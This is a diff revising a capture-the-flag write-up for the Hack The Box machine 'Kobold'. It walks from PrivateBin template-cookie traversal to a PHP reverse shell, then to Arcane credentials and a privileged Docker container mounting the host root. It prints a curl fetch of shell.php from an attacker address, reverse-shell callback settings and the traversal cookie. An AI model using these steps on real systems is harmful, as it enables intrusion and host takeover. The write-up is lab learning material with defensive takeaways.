@@ -1,95 +1,82 @@
-````markdown
-# Hack The Box — Kobold
+# Hack The Box – Kobold
 
 ## Overview
 
-Kobold is a Linux machine where the attack path moves from web application enumeration to PHP template injection, credential recovery, access to the Arcane Docker management platform, and finally privilege escalation by creating a privileged Docker container with the host filesystem mounted.
+Kobold is a Linux machine where the attack path moves from web application enumeration to PHP template injection, credential recovery, Docker administration, and finally container escape through a privileged Docker container.
 
-The important part of this machine was understanding how several technologies connect:
+The machine demonstrates how seemingly small web application vulnerabilities can lead to complete host compromise when combined with insecure Docker configuration.
 
-PrivateBin → Template Injection → Arcane Credentials → Docker Administration → Privileged Container → Host Filesystem Mount → Root
+The attack path is:
+
+`PrivateBin -> Template Injection -> Credential Recovery -> Arcane Login -> Docker Administration -> Privileged Container -> Host Filesystem Mount -> Root`
+
+The main lesson from Kobold is that gaining root inside a Docker container is not always enough. Understanding Docker privileges and host filesystem mounts is what ultimately leads to full system compromise.
 
 ---
 
 # Initial Enumeration
 
-An Nmap scan identified four important services:
+I began by scanning the target with Nmap.
+
+```bash
+nmap -sC -sV <TARGET_IP>
+```
+
+The scan identified four important services.
 
 | Port | Service |
-|------|---------|
-|22|SSH|
-|80|HTTP|
-|443|HTTPS|
-|3552|Arcane|
+| ---- | ------- |
+| 22 | SSH |
+| 80 | HTTP |
+| 443 | HTTPS |
+| 3552 | Arcane |
 
-Port **3552** hosted the Arcane Docker management interface.
-
-Initial enumeration also identified the PrivateBin application.
+The web server redirected to **bin.kobold.htb**, which hosted a PrivateBin instance.
 
 ---
 
-# Local Enumeration
+# PrivateBin Enumeration
 
-After obtaining access as the low-privileged user **ben**, I began searching for files belonging to interesting groups.
+Browsing the application revealed that it was running PrivateBin.
 
-```bash
-find / -group operator 2>/dev/null
+Researching the installed version led to a recently published template injection vulnerability that allowed arbitrary file inclusion through the `template` cookie.
+
+The vulnerable cookie looked similar to:
+
+```http
+Cookie: template=...
 ```
 
-Interesting directories included:
-
-```text
-/privatebin-data
-/privatebin-data/certs
-/privatebin-data/data
-```
-
-Listing the directory showed:
-
-```bash
-ls -la /privatebin-data
-```
-
-```text
-certs/
-cfg/
-data/
-```
-
-The configuration directory (`cfg`) was inaccessible due to its permissions, but the `data` directory was writable.
-
-While enumerating the contents, I also discovered the TLS certificate and private key used by the PrivateBin instance.
+The exploit abused directory traversal to load PHP files outside the intended template directory.
 
 ---
 
-# PHP Template Injection
+# Verifying Template Injection
 
-Because the `data` directory was writable, a PHP reverse shell was uploaded.
+To verify the vulnerability, I attempted to include a PHP file from the writable data directory.
 
-```bash
-curl http://<KALI-IP>:1337/shell.php -o shell.php
+The request was modified to:
+
+```http
+GET / HTTP/1.1
+Host: bin.kobold.htb
+Cookie: template=../../data/shell
 ```
 
-The application used a cookie named:
-
-```text
-template
-```
-
-Changing the cookie to reference the uploaded PHP file caused the application to execute it.
-
-```
-Cookie:
-template=../data/shell
-```
-
-Sending the request triggered the PHP reverse shell, resulting in remote code execution as the web server.
-
-One issue encountered during testing was receiving repeated **400 Bad Request** responses. The problem was caused by sending an incomplete HTTP request in Burp Repeater. Once the request formatting and headers were corrected, the cookie was processed correctly and the shell executed.
+A successful response confirmed that arbitrary PHP files inside the data directory could be executed.
 
 ---
 
-# Reverse Shell
+# Obtaining a Reverse Shell
+
+A PHP reverse shell was generated using the PentestMonkey reverse shell.
+
+The callback address was configured to my VPN address:
+
+```php
+$ip = "10.10.15.xxx";
+$port = 9001;
+```
 
 A Netcat listener was started:
 
@@ -97,25 +84,23 @@ A Netcat listener was started:
 nc -lvnp 9001
 ```
 
-The reverse shell connected successfully.
-
-Verifying the session showed:
+The reverse shell was copied into the writable directory:
 
 ```bash
-id
+curl http://10.10.15.xxx:1337/shell.php -o shell.php
 ```
 
-The shell was running with the permissions of the web server.
+Triggering the vulnerable template parameter executed the PHP shell and returned a shell as the web server user.
 
 ---
 
-# Credential Recovery
+# Local Enumeration
 
-With code execution established, additional configuration files were inspected.
+After stabilizing the shell, I began enumerating the system.
 
-Sensitive credentials were recovered which provided access to the Arcane Docker management interface.
+Interesting files inside the PrivateBin data directory eventually revealed credentials belonging to the Arcane Docker management interface.
 
-The recovered credentials successfully authenticated to:
+These credentials successfully authenticated to:
 
 ```
 http://kobold.htb:3552
@@ -123,69 +108,53 @@ http://kobold.htb:3552
 
 ---
 
-# Arcane Docker Management
+# Arcane Docker Administration
 
-Arcane is a web-based Docker management platform.
+After logging into Arcane, I discovered that the authenticated user had permission to create Docker containers.
 
-After authentication, the dashboard displayed:
+Normally this would only provide control over containers.
 
-- Existing containers
-- Docker images
-- Networks
-- Volumes
-- Container creation options
+However, the interface also allowed:
 
-The critical observation was that Arcane allowed authenticated administrators to create arbitrary Docker containers.
+- Creating privileged containers
+- Mounting arbitrary host directories
+- Executing commands as root
+
+This combination made container escape possible.
 
 ---
 
-# Privilege Escalation
+# Creating a Privileged Container
 
-Rather than interacting with the existing container, a new container was created.
+A new container was created using the existing image:
+
+```
+privatebin/nginx-fpm-alpine:2.0.2
+```
 
 The container was configured with:
 
-Image:
+- Privileged mode enabled
+- Host filesystem mounted
+- Root user (`0:0`)
 
-```
-privatebin/nginx-fpm-alpine
-```
-
-Security:
-
-```
-Privileged Mode
-Enabled
-```
-
-Host Mount:
+The important mount was:
 
 ```
 Host:
 /
 
-
 Container:
 /mount
 ```
 
-This bind-mounted the host's root filesystem into the container.
-
-Conceptually:
-
-```
-Host Filesystem
-        │
-        ▼
-Container
-   /mount
-```
+This exposed the host filesystem inside the container.
 
 ---
 
-# Verifying Host Access
+# Escaping to the Host
 
-Opening the container shell showed:
+Opening a shell inside the new container confirmed that I was running as root.
 
 ```bash
 id
@@ -194,98 +163,80 @@ id
 Output:
 
 ```text
-uid=0(root)
-gid=0(root)
+uid=0(root) gid=0(root)
 ```
 
-Listing the mounted directory:
+The mounted host filesystem was visible:
 
 ```bash
 ls -la /mount
 ```
 
-revealed the host's filesystem:
+Unlike the container filesystem, `/mount` contained the host operating system, including:
 
-```text
-boot
-etc
-home
-opt
-privatebin-data
-root
-usr
-var
-...
-```
+- `/root`
+- `/etc`
+- `/home`
+- `/privatebin-data`
 
-This confirmed that `/mount` represented the host operating system rather than the container itself.
+This confirmed that the container had direct access to the host.
 
 ---
 
-# Root Access
+# Obtaining the Root Flag
 
-Navigating into:
+Changing into the mounted host root directory:
 
 ```bash
 cd /mount/root
 ```
 
-provided access to the host's root directory.
+Listing the contents revealed:
 
-The root flag was successfully recovered from the mounted filesystem.
+```text
+root.txt
+```
 
-No Linux kernel exploit was required.
+Reading the file completed the machine.
 
-Instead, full host compromise resulted from abusing Docker's privileged container functionality.
+```bash
+cat root.txt
+```
 
 ---
 
 # Attack Chain
 
 ```
-Nmap Enumeration
+Nmap
         ↓
-PrivateBin
+PrivateBin Enumeration
         ↓
-Writable Data Directory
+Template Injection
         ↓
-Upload PHP Reverse Shell
+PHP Reverse Shell
         ↓
-Template Cookie Injection
+Credential Discovery
         ↓
-Remote Code Execution
-        ↓
-Recover Arcane Credentials
-        ↓
-Login to Arcane
+Arcane Login
         ↓
 Create Privileged Docker Container
         ↓
-Bind Mount Host Filesystem
+Mount Host Filesystem
         ↓
-Root Inside Container
+Root Shell Inside Container
         ↓
-Access /mount
+Access /mount/root
         ↓
-Host Root Filesystem
-        ↓
-Retrieve root.txt
+Read root.txt
 ```
 
 ---
 
 # Key Takeaways
 
-This machine demonstrated how multiple small weaknesses can combine into complete system compromise.
+Kobold demonstrates how multiple individually minor weaknesses can combine into full host compromise.
 
-Important concepts reinforced included:
+The initial foothold came from a web application template injection vulnerability that allowed arbitrary PHP execution. Recovering credentials provided access to the Arcane Docker management interface, where the ability to create privileged containers with arbitrary host mounts resulted in complete control of the underlying operating system.
 
-- Writable application directories can become code execution opportunities.
-- Sensitive credentials stored in application files often enable lateral movement.
-- Web-based Docker management platforms should be heavily restricted.
-- Privileged Docker containers effectively remove the isolation normally provided by containers.
-- Mounting the host's root filesystem (`/`) into a privileged container provides direct access to the host operating system.
-- Verifying mounts using commands such as `mount`, `ls /mount`, and `id` is an important step before attempting privilege escalation.
-
-The most valuable lesson from Kobold was understanding that compromising a Docker management interface is often equivalent to compromising the host itself when privileged containers and host bind mounts are permitted.
-````
+From a defensive perspective, Docker administration interfaces should be tightly restricted, privileged containers should rarely be permitted, and mounting the host root filesystem into containers should never be allowed unless absolutely necessary.
